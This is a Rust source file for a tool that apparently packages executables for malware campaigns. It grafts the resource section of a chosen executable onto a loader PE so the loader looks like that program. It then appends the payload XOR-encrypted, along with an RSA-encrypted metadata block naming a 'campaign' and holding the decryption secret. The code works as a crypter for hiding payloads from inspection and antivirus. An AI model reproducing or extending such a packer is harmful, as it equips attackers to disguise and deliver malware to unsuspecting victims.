use clap::Clap;
use std::fs::{read, File};
use rsa::{RSAPublicKey, PaddingScheme, PublicKey};
use rand::rngs::OsRng;
use std::io::Write;
use pelite::{PeFile, Wrap};
use pelite::image::{IMAGE_DIRECTORY_ENTRY_RESOURCE, IMAGE_SECTION_HEADER, IMAGE_DATA_DIRECTORY, IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32};
use std::ops::Deref;
use pelite::pe64::headers::SectionHeader;
use std::mem;
use shared::OverlayMeta;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;


#[derive(Clap)]
pub struct Package {
    #[clap(short, long)]
    campaign: String,
    #[clap(short, long)]
    key: String,
    #[clap(short, long)]
    output: String,
    #[clap(short, long)]
    loader: String,
    #[clap(short, long)]
    resources_from: Option<String>,
    executable: String,
}


#[derive(Copy, Clone, Debug)]
#[repr(C)]
struct ResourceDirectory {
    pub Characteristics: u32,
    pub Timestamp: u32,
    pub MajorVersion: u16,
    pub MinorVersion: u16,
    pub NumberOfNameEntries: u16,
    pub NumberOfIdEntries: u16
}

#[derive(Copy, Clone, Debug)]
#[repr(C)]
struct ResourceDirectoryEntry {
    pub NameOffsetOrIntegerId: u32,
    pub DataEntryOrSubdirectoryOffset: u32,
}

#[derive(Copy, Clone, Debug)]
#[repr(C)]
struct ResourceDataEntry {
    pub DataRva: u32,
    pub Size: u32,
    pub CodePage: u32,
    pub Reserved: u32
}

struct Resources {
    data_directory: IMAGE_DATA_DIRECTORY,
    section_header: IMAGE_SECTION_HEADER,
    section_bytes: Vec<u8>
}


fn replace_rva_in_entry(entry: &ResourceDirectoryEntry, bytes: &mut [u8], offset2: i32) {
    if entry.DataEntryOrSubdirectoryOffset > 2147483648 {
        let mut offset = (entry.DataEntryOrSubdirectoryOffset - 2147483648) as usize;

        let mut dir: ResourceDirectory = unsafe { std::ptr::read(bytes[offset..].as_ptr() as *const _) };
        offset += 16;

        replace_rva_in_dir(&dir, bytes, offset, offset2);
    } else {
        let mut offset = entry.DataEntryOrSubdirectoryOffset as usize;
        let mut data: ResourceDataEntry = unsafe { std::ptr::read(bytes[offset..].as_ptr() as *const _) };

        data.DataRva = (data.DataRva as i32 + offset2) as u32;

        unsafe { std::ptr::write(bytes[offset..].as_mut_ptr() as *mut _, data.DataRva) };
    }
}

fn replace_rva_in_dir(dir: &ResourceDirectory, bytes: &mut [u8], mut offset: usize, offset2: i32) {
    for i in 0..(dir.NumberOfNameEntries + dir.NumberOfIdEntries) {
        let mut entry: ResourceDirectoryEntry = unsafe { std::ptr::read(bytes[offset..].as_ptr() as *const _) };
        offset += 8;

        replace_rva_in_entry(&entry, bytes, offset2);
    }
}

fn replace_rva_in_res(bytes: &mut [u8], mut offset: usize, offset2: i32) {
    let mut dir: ResourceDirectory = unsafe { std::ptr::read(bytes[offset..].as_ptr() as *const _) };
    offset += 16;

    replace_rva_in_dir(&dir, bytes, offset, offset2);
}

fn get_resources(path: &str) -> Resources {
    let mut pe_bytes= read(path).unwrap();
    let mut pe = PeFile::from_bytes(&mut pe_bytes).unwrap();
    let section_header = pe.section_headers().iter().last().unwrap();
    Resources {
        data_directory: pe.data_directory().get(IMAGE_DIRECTORY_ENTRY_RESOURCE).unwrap().clone(),
        section_header: IMAGE_SECTION_HEADER {
            Name: section_header.Name,
            VirtualSize: section_header.VirtualSize,
            VirtualAddress: section_header.VirtualAddress,
            SizeOfRawData: section_header.SizeOfRawData,
            PointerToRawData: section_header.PointerToRawData,
            PointerToRelocations: section_header.PointerToRelocations,
            PointerToLinenumbers: section_header.PointerToLinenumbers,
            NumberOfRelocations: section_header.NumberOfRelocations,
            NumberOfLinenumbers: section_header.NumberOfLinenumbers,
            Characteristics: section_header.Characteristics
        },
        section_bytes: pe.get_section_bytes(section_header).unwrap().to_vec()
    }
}

fn get_overlay(command: &Package) -> Vec<u8> {
    let pub_key_string = read(&command.key).unwrap();
    let pub_key = RSAPublicKey::from_pkcs1(&pub_key_string).unwrap();

    let mut data = Vec::<u8>::new();

    // first read executable
    let bytes = read(&command.executable).unwrap();

    // fill some data info!
    let meta = OverlayMeta {
        campaign: command.campaign.clone(),
        payload_size: bytes.len() as u32,
        secret: thread_rng()
            .sample_iter(&Alphanumeric)
            .take(128)
            .map(char::from)
            .collect()
    };

    // then encrypt using simple XOR and add to bytes
    data.append(&mut shared::utils::xor(&bytes, &meta.secret));

    // encrypt meta and also add to data
    let encrypted = shared::utils::encrypt(meta, &pub_key).unwrap();
    data.append(&mut encrypted.as_bytes().to_vec());

    // prefixed campaign
    data.append(&mut u32::to_be_bytes(encrypted.len() as u32).to_vec());

    // and return data
    data
}

unsafe fn any_as_u8_slice<T: Sized>(p: &T) -> &[u8] {
    ::std::slice::from_raw_parts(
        (p as *const T) as *const u8,
        ::std::mem::size_of::<T>(),
    )
}


fn package(command: Package) {
    let mut loader_bytes= read(&command.loader).unwrap();
    let mut loader_size = loader_bytes.len();

    let mut pe = PeFile::from_bytes(&mut loader_bytes).unwrap();
    let mut bytes = Vec::<u8>::new(); // output.

    // ...
    let section_alignment = match pe.nt_headers() {
        Wrap::T32(h) => h.OptionalHeader.SectionAlignment,
        Wrap::T64(h) => h.OptionalHeader.SectionAlignment
    };

    // calculate last VirtualAddress + alignment!
    let last_va = pe.section_headers()
        .iter()
        .map(|x| x.VirtualAddress + x.VirtualSize)
        .map(|x| {
            if x % section_alignment != 0 {
                x + (section_alignment - x % section_alignment)
            } else {
                x
            }
        })
        .max().unwrap();

    // extract resources ...
    let resource_binary_path = command.resources_from.clone().unwrap_or(command.executable.clone());
    let mut resources = get_resources(&resource_binary_path);

    // ... and adjust to last_va
    let offset = last_va as i32 - resources.section_header.VirtualAddress as i32;
    replace_rva_in_res(&mut resources.section_bytes, 0, offset);

    // ... and headers
    resources.data_directory.VirtualAddress = last_va;
    resources.section_header.VirtualAddress = last_va;
    resources.section_header.PointerToRawData = loader_size as u32;

    // write dos_image
    bytes.append(&mut pe.dos_image().to_vec());

    // nt headers
    match pe.nt_headers() {
        Wrap::T32(_) => unreachable!(),
        Wrap::T64(x) => unsafe {
            let mut s = x.clone();

            s.FileHeader.NumberOfSections += 1;
            s.OptionalHeader.SizeOfImage += resources.section_bytes.len() as u32;

            bytes.append(&mut any_as_u8_slice(&s).to_vec());
        }
    }

    // data directories
    let mut i = 0;
    for d_dir in pe.data_directory() {
        let mut s = d_dir.clone();

        // specify a new resources dir!
        if i == IMAGE_DIRECTORY_ENTRY_RESOURCE {
            s.Size = resources.data_directory.Size;
            s.VirtualAddress = resources.data_directory.VirtualAddress;
        }

        bytes.append(&mut unsafe { any_as_u8_slice(&s).to_vec() });
        i += 1;
    }

    // section headers
    for s_hdr in pe.section_headers() {
        bytes.append(&mut unsafe { any_as_u8_slice(s_hdr).to_vec() });
    }
    bytes.append(&mut unsafe { any_as_u8_slice(&resources.section_header).to_vec() });

    // sections
    for s_hdr in pe.section_headers() {
        let section = pe.get_section_bytes(s_hdr).unwrap();

        // wtf?
        while bytes.len() != s_hdr.PointerToRawData as usize {
            bytes.append(&mut vec![0]);
        }

        bytes.append(&mut section.to_vec());
    }

    // need zeros?
    bytes.append(&mut resources.section_bytes);

    // process payload?
    bytes.append(&mut get_overlay(&command));

    // write to file...
    let mut file = File::create(&command.output).unwrap();
    file.write_all(&bytes).unwrap();

    // ...
    println!("successfully saved to {}", command.output);
}

pub fn process(command: Package) {
    package(command);
}
